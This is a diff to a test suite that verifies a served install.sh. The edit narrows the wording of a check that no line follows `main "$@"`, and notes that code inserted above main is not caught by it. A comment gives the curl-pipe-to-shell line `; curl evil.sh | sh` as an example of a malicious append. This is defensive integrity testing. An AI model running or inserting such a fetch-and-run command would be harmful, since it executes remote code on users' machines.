@@ -305,7 +305,7 @@ describe("body integrity — install.sh shape and bounded size (H-08)", () => {
   //   (c) Size CEILING (100 KB) — gross corruption. Surgical appends are
   //       caught by (a) here and, in production, by the deploy-time and hourly
   //       sha256 checks (deploy-worker.yml, served-installer-integrity.yml),
-  //       plus the "ends at main" tail check below.
+  //       plus the "last line is the entry-point call" check below.
   // The shape and size assertions are intentionally kept after byte-equality
   // landed — they pinpoint truncation vs substitution as different bugs.
   // WOR-323 promoted byte-equality from the original "Phase 3 will add this"
@@ -345,15 +345,17 @@ describe("body integrity — install.sh shape and bounded size (H-08)", () => {
     expect(body.length).toBeLessThan(100_000);
   });
 
-  it("install-script body ends at its entry point — nothing runs after main", async () => {
+  it("install-script body's last line is the entry-point call (no appended lines)", async () => {
     // Replaces a tight SIZE ceiling (24.5 KB, raised four times to 31 KB) that was
     // meant to catch a surgical append such as `; curl evil.sh | sh`. A size cap
     // can't: the file is ~44% comments, so an attacker trims 60 bytes of comment
     // and appends at the same size, and the cap kept blocking honest fixes
     // instead. What the served bytes must equal is pinned by byte-equality above
     // (and in production by the deploy-time and hourly sha256 checks). This pins
-    // the property the ceiling was standing in for: the last command the script
-    // executes is `main "$@"` — no line after it can run.
+    // the narrow property the ceiling was standing in for: no line is appended
+    // after `main "$@"`. It does NOT stop code inserted ABOVE main (a new EXIT
+    // trap, an edited cleanup() or main()) — that is caught only by review and by
+    // byte-equality against the release tag.
     const res = await SELF.fetch("https://worthless.sh/", {
       headers: { "user-agent": CURL_UA },
     });
